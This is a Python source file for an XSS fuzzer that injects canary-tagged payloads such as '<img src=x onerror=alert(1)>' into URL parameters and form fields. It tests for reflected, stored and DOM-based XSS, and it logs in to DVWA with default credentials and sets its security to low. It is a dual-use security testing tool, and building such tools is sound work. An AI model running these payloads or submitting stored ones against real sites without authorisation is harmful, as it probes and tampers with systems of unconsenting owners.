import requests
import re
import random
import time
from urllib.parse import urljoin, urlparse, quote
from uuid import uuid4
from html import escape
from concurrent.futures import ThreadPoolExecutor, as_completed
from auth import seleniumLogin
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Regex templates for XSS injections
SCRIPT_RE = r"<script[^>]*>.*?<!--\s*({token})\s*-->.*?</script>"
ATTR_RE   = r"\bon\w+\s*=\s*(['\"]).*?({token}).*?\1"
JSURL_RE  = r"(?:href|src)\s*=\s*(['\"])\s*javascript:.*?({token}).*?\1"

# Cache for regex objects to avoid recompiling
_regex_cache = {}

# To exclude SQL errors when looking for XSS
SQL = [
    "you have an error in your sql syntax",
    "mysql_fetch", "mysqli_", "pg_query", "syntax error at or near",
    "unclosed quotation mark after the character string", "ora-"
]

dom_payloads = [
        "<img src=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "'\"><img src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "</script><script>alert(1)</script>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<body onload=alert(1)>",
        "<img src=1 onerror=alert`1`>",
        "<img src=x onerror=confirm(1)>",
        "<marquee onstart=alert(1)>",
        "javascript:alert(1)"
    ]

def canary(payload, token):
    """
        Append payload with unique token
    """
    return f"{payload}<!--{token}-->"


def detectXSS(body, token, markedPayload):
    """
        If token appears then it's worked
    """
    lowerBody = body.lower()
    token = token.lower()

    if token not in lowerBody:
        return False

    # If only payload appears its usually safe
    if escape(markedPayload, quote=True).lower() in lowerBody:
        return False

    # cache regex for this token
    if token not in _regex_cache:

        if len(_regex_cache) >= 32:
            _regex_cache.clear()

        _regex_cache[token] = (
            re.compile(SCRIPT_RE.format(token=re.escape(token)), re.I | re.S),
            re.compile(ATTR_RE.format(token=re.escape(token)), re.I | re.S),
            re.compile(JSURL_RE.format(token=re.escape(token)), re.I | re.S)
        )

    script_re, attr_re, jsurl_re = _regex_cache[token]

    # Check if xss is in dangerous contexts
    if script_re.search(body) or attr_re.search(body) or jsurl_re.search(body):
        return True

    # Filter SQL errors
    if any(err in lowerBody for err in SQL):
        return False

    # Check token in tags
    if any(tag in lowerBody for tag in
           ("<img", "<iframe", "<svg", "<a ", "<input", "<video", "<audio")) and f"<!--{token}-->" in lowerBody:
        return True

    return False

def isFuzzableField(field):
    """
        Check if form field is fuzzable
    """
    if not field:
        return False

    lowered = field.lower()

    # List of skips to avoid useless form fuzzing
    skips = [
        "user_token", "security", "login", "upload", "change", "submit",
        "max_file_size", "step", "create_db", "password",
        "btnclear", "btnsign","rememberme","captcha", "default"
    ]

    return not any(skip in lowered for skip in skips)



class XSSFuzzer:

    def __init__(self, baseUrl, useCrawler = False, outputToFile= False, wordlistPath=None,isDVWA= False, isSilent=False, headless= True):
        self.baseUrl = baseUrl
        self.useCrawler = useCrawler
        self.wordlistPath = wordlistPath
        self.outputToFile = outputToFile
        self.payloads = self.loadWordlist() if self.wordlistPath is not None else []
        self.isSilent = isSilent
        self.token = f"XSSCanary-{uuid4().hex[:8]}"
        self.headless = headless

        self.isDVWA = isDVWA
        self.session = requests.Session()
        self.userToken = ""

        self.vulnerableParams = []

        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "Referer": self.baseUrl,
        }

        if self.isDVWA:
            self.login()

    def loadWordlist(self):
        """
            Load payload from wordlist
        """
        # Check if list is passed
        if isinstance(self.wordlistPath, list):
            return self.wordlistPath

        try:
            with open(self.wordlistPath, 'r', encoding='utf-8', errors='replace') as f:
                # Strips the lines
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            # On error raise exception
            raise RuntimeError(f"[-] Failed to load wordlist from {self.wordlistPath}: {e}")

    def sendRequest(self, url, payload=None, markedPayload= None):
        """
            Send a single GET request and check for success
        """
        try:
            # Check if DVWA and add token
            if self.isDVWA and self.userToken:
                separator = '&' if '?' in url else '?'
                url = f"{url}{separator}user_token={self.userToken}"

            response = self.session.get(url, headers=self.headers, timeout=3, allow_redirects=False)

            # Refresh token
            if self.isDVWA:
                tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', response.text)
                if tokenMatch:
                    self.userToken = tokenMatch.group(1)

            # XSS detection
            if detectXSS(response.text, self.token, markedPayload):
                result = {
                    "url": url,
                    "payload": payload,
                    "status_code": response.status_code,
                    "snippet": response.text[:200]
                }
                self.vulnerableParams.append(result)
                return {"type": "vulnerable", "data": result}

        except requests.exceptions.Timeout:
            # When fuzzing large endpoints timeouts overwhelm, disable if needed
            pass

        except requests.RequestException as e:
            if not self.isSilent:
                print(f"[!] Request failed for {url}: {e}")

        return None

    def paramXSS(self):
        """
            Fuzz query params for reflected XSS
        """
        parsed = urlparse(self.baseUrl)

        # Only fuzz if fuzz in query
        if "FUZZ" not in parsed.query:
            print("[-] No 'FUZZ' keyword found")
            return []

        # Reconstruct base URL without query
        baseNoQuery = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        originalQuery = parsed.query

        tasks = []
        results = []

        with ThreadPoolExecutor(max_workers=20) as executor:
            for payload in self.payloads:
                # Replace FUZZ with the payload, uniqely mark it, encode it for URL injection
                markedPayload = canary(payload, self.token)
                encoded = quote(markedPayload, safe="")
                fuzzedQuery = originalQuery.replace("FUZZ", encoded)
                fullUrl = f"{baseNoQuery}?{fuzzedQuery}"

                tasks.append(executor.submit(self.sendRequest, fullUrl,payload=payload, markedPayload=markedPayload))
            # Collect results as requests complete
            for future in as_completed(tasks):
                result = future.result()
                if result and "data" in result:
                    results.append(result["data"])
        return results

    def formXSS(self, forms):
        """
            Takes the forms retrieved by the crawler and fuzzes them for reflected XSS
        """
        results = []

        with ThreadPoolExecutor(max_workers=20) as executor:
            for form in forms:
                tasks = []
                # To track future information for saving
                ctx = {}

                url = form.get("url")
                method = (form.get("method") or "POST").upper()
                fields = form.get("formFields") or[]

                # Skip invalid form objects
                if not url or not fields:
                    continue

                # Normalize Url
                parsed = urlparse(self.baseUrl)
                if not url.startswith("http"):
                    url = f"{parsed.scheme}://{parsed.netloc}{url}"

                for raw in self.payloads:
                    marked = canary(raw, self.token)

                    if method == "POST":
                        # POST form fuzzing
                        data = {}

                        for field in fields:
                            # Inject payload into fuzzable fields
                            if isFuzzableField(field):
                                data[field] = marked

                            else:
                                data[field] = "test"

                        if self.isDVWA and self.userToken:
                            data.setdefault("user_token", self.userToken)

                        fut = executor.submit(self.session.post, url, data=data, headers=self.headers, timeout=3, allow_redirects=False )

                        tasks.append(fut)
                        ctx[fut] = (url, raw, marked)

                    else:
                        # GET form fuzzing
                        params = []
                        for field in fields:
                            if isFuzzableField(field):
                                params.append(f"{field}={quote(marked, safe='')}")

                            else:
                                params.append(f"{field}=test")

                        # Construct GET request
                        separator = "&" if "?" in url else "?"
                        fullUrl = f"{url}{separator}{'&'.join(params)}"

                        fut = executor.submit( self.session.get, fullUrl, headers=self.headers, timeout=3,allow_redirects=False)

                        tasks.append(fut)
                        ctx[fut] = (fullUrl, raw,marked)

                # collect responses as they finish
                for fut in as_completed(tasks):
                    try:
                        res = fut.result()

                    except Exception:
                        continue

                    finUrl, raw, marked = ctx[fut]

                    if self.isDVWA:
                        tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', res.text)

                        if tokenMatch:
                            self.userToken = tokenMatch.group(1)

                    # Check for XSS
                    if detectXSS(res.text, self.token, marked):
                        results.append({
                            "url": finUrl,
                            "payload": raw,
                            "status_code": res.status_code,
                            "snippet": res.text[:200]
                        })

        return results


    def storedXSS(self, forms,endpoints=None):
        """
            Submits payload then revisits to see if payload still there
        """
        results = []
        pages = set()

        with ThreadPoolExecutor(max_workers=20) as executor:
            for form in forms:
                tasks = []
                ctx = {}

                url = form.get("url")
                method = (form.get("method") or "POST").upper()
                fields = form.get("formFields") or []

                if not url or not fields:
                    continue

                # Normalize Url
                parsed = urlparse(self.baseUrl)
                if not url.startswith("http"):
                    url = f"{parsed.scheme}://{parsed.netloc}{url}"

                # Track the form to potentially revisit
                pages.add(url)

                for raw in self.payloads:
                    marked = canary(raw,self.token)

                    if method == "POST":
                        # POST form fuzzing
                        data = {}

                        for field in fields:
                            if isFuzzableField(field):
                                data[field] = marked

                            else:
                                data[field] = "test"

                        if self.isDVWA and self.userToken:
                            data.setdefault("user_token", self.userToken)

                        fut = executor.submit(self.session.post, url, data=data, headers=self.headers, timeout=3,allow_redirects=False)

                        tasks.append(fut)
                        ctx[fut] = (url,raw,marked)

                    else:
                        # GET form fuzzing
                        params = []

                        for field in fields:
                            if isFuzzableField(field):
                                params.append(f"{field}={quote(marked, safe='')}")

                            else:
                                params.append(f"{field}=test")

                        separator = "&" if "?" in url else "?"
                        fullUrl = f"{url}{separator}{'&'.join(params)}"

                        fut = executor.submit(self.session.get, fullUrl, headers=self.headers, timeout=3,allow_redirects=False)

                        tasks.append(fut)
                        ctx[fut] = (fullUrl, raw, marked)

                # Collect results
                for fut in as_completed(tasks):
                    try:
                        res = fut.result()

                    except Exception:
                        continue

                    finUrl, raw, marked = ctx[fut]

                    if self.isDVWA:
                        tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', res.text)

                        if tokenMatch:
                            self.userToken = tokenMatch.group(1)

                    # Follow redirections after submitting form
                    if res.status_code in (301, 302, 303,307, 308):
                        loc = res.headers.get("Location")
                        if loc:
                            pages.add(loc if loc.startswith("http")else urljoin(finUrl, loc))

        # Merge extra endpoints
        if endpoints:
            parsed = urlparse(self.baseUrl)
            base = f"{parsed.scheme}://{parsed.netloc}"

            for end in endpoints:
                if not end:
                    continue

                pages.add(end if end.startswith("http") else f"{base}{end}")

        # Prebuild marked payloads
        markedPayloads = [(raw, canary(raw, self.token)) for raw in self.payloads]

        # Revisit collected pages
        with ThreadPoolExecutor(max_workers=20) as executor:

            futToPage = {
                executor.submit(self.session.get,page
                if (not (self.isDVWA and self.userToken)) else
                    f"{page}{'&' if '?' in page else '?'}user_token={self.userToken}",
                    headers=self.headers,
                    timeout=3,
                    allow_redirects=True
                ): page
                for page in pages
            }

            for fut in as_completed(futToPage):

                finUrl = futToPage[fut]
                try:
                    res = fut.result()

                except Exception:
                    continue

                # Refresh DVWA token if needed
                if self.isDVWA:
                    tokenMatch = re.search(
                        r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]',
                        res.text
                    )
                    if tokenMatch:
                        self.userToken = tokenMatch.group(1)

                body = res.text
                lowerBody = body.lower()

                # If no token at all continue
                if self.token.lower() not in lowerBody:
                    continue

                # Check if payloads still persists
                for raw, marked in markedPayloads:
                    if detectXSS(body, self.token, marked):
                        results.append({
                            "url": finUrl,
                            "payload": raw,
                            "status_code": res.status_code,
                            "snippet": body[:200]
                        })
                        # Add break if you just want to see its vulnerable, without lists all successful payloads
                        #break

        return results


    def domXSS(self, forms= None, endpoints= None):
        """
            Submits payload via query then loads and checks JS for payload
        """
        results =[]

        parsedBase = urlparse(self.baseUrl)
        base = f"{parsedBase.scheme}://{parsedBase.netloc}"

        candidates = []

        if forms:
            # Build URLs from forms
            for form in forms:

                url = form.get("url")
                method = (form.get("method") or "GET").upper()
                fields = form.get("formFields") or[]

                # Only fuzz get forms with fields
                if not url or method != "GET" or not fields:
                    continue

                # Normalize relative form URLs
                if not url.startswith("http"):
                    url = f"{base}{url}"

                # Try all DOM specific payloads
                for raw in dom_payloads:
                    marked = canary(raw, self.token)
                    parts = []

                    for field in fields:
                        parts.append(f"{field}={quote(marked, safe='')}")

                    seperator = "&" if "?" in url else "?"
                    candidates.append((f"{url}{seperator}{'&'.join(parts)}", raw, marked))
                    candidates.append((f"{url}#{quote(marked, safe='')}", raw, marked))

        if endpoints:
            # Build URLs from endpoints
            for ep in endpoints:
                rawUrl = ep.get("url")
                params = ep.get("params") or []

                if not rawUrl or not params:
                    continue

                # Normalize URLs
                fullUrl = rawUrl if rawUrl.startswith("http") else f"{base}{rawUrl}"

                # Randomly sample the dom_payloads to save time
                chosenPayloads = dom_payloads if len(dom_payloads) <= 4 else random.sample(dom_payloads, 4)

                # Try chosen DOM specific payloads
                for raw in chosenPayloads:
                    marked = canary(raw,self.token)
                    parts = [f"{p}={quote(marked,safe='')}" for p in params]
                    seperator = "&" if "?" in fullUrl else "?"
                    candidates.append((f"{fullUrl}{seperator}{'&'.join(parts)}", raw, marked))
                    candidates.append((f"{fullUrl}#{quote(marked, safe='')}", raw, marked))

        # If no fuzzable URLs found then return empty
        if not candidates:
            return results

        # Configure the selenium webdriver
        options = Options()
        if self.headless:
            options.headless = True
            options.add_argument("--headless=new")
        options.add_argument("--window-size=1920,1080")

        # TO silence console
        options.add_argument("--log-level=3")
        options.add_experimental_option("excludeSwitches", ["enable-logging"])

        driver = webdriver.Chrome(options=options)
        try:
            baseUrl = f"{urlparse(self.baseUrl).scheme}://{urlparse(self.baseUrl).netloc}"

            if self.isDVWA:
                loggedIn = seleniumLogin(driver, baseUrl)
                if not loggedIn:
                    print("[!] Selenium login failed. Aborting domXSS fuzzing.")
                    driver.quit()
                    return results

            seen = set()
            for finUrl, raw, marked in candidates:
                # Normalize the page key
                pageKey = finUrl.split("?", 1)[0].split("#", 1)[0]

                if pageKey in seen:
                    # Skip already tested pages
                    continue

                urlCheck = finUrl

                # Add DVWA token if required
                if self.isDVWA and self.userToken:
                    urlCheck = f"{finUrl}{'&' if '?' in finUrl else '?'}user_token={self.userToken}"

                # pre check with raw http to skip reflected XSS
                try:
                    pre = self.session.get(urlCheck, headers=self.headers, timeout= 3,allow_redirects=False)
                    pre_body = pre.text or ""
                except Exception:
                    pre_body = ""

                reflected = self.token.lower() in pre_body.lower()

                if reflected:
                    continue

                try:
                    driver.get(finUrl)
                    # Estimate to allow for JS
                    time.sleep(0.25)
                    body = driver.page_source or ""

                    # Check if DOM XSS worked
                    if self.token.lower() in body.lower() and detectXSS(body, self.token, marked):
                        results.append({
                            "url": finUrl,
                            "payload": raw,
                            "status_code": 200,
                            "snippet": body[:200]
                        })
                        seen.add(pageKey)

                except Exception:
                    continue
        finally:
            driver.quit()

        return results

    def login(self):
        """
            Log in to DVWA using default credentials and set security to low
        """

        parsed = urlparse(self.baseUrl)
        base = f"{parsed.scheme}://{parsed.netloc}"

        loginUrl = f"{base}/login.php"
        securityUrl = f"{base}/security.php"

        try:
            loginPage = self.session.get(loginUrl, headers=self.headers)
            # print("[DEBUG] Login page response\n:", loginPage.text)

            tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', loginPage.text)

            token = tokenMatch.group(1) if tokenMatch else ''
            # print(f"[DEBUG] CSRF token from login page:{token}")

            if not token:
                print("[!] Could not extract CSRF token from login page!")

                return False

            loginData = {
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": token
            }

            res = self.session.post(loginUrl, data=loginData, headers=self.headers)

            if "Login failed" in res.text:
                print("[!] Login failed. Check credentials.")
                return False

            securityPage = self.session.get(securityUrl, headers=self.headers)
            tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', securityPage.text)
            token = tokenMatch.group(1) if tokenMatch else ''

            securityData = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": token
            }

            self.session.post(securityUrl, data=securityData, headers=self.headers)
            # print("[+] Logged in to DVWA and set security level to low")

            return True

        except requests.RequestException as e:
            print(f"[!] Login request failed: {e}")
            return False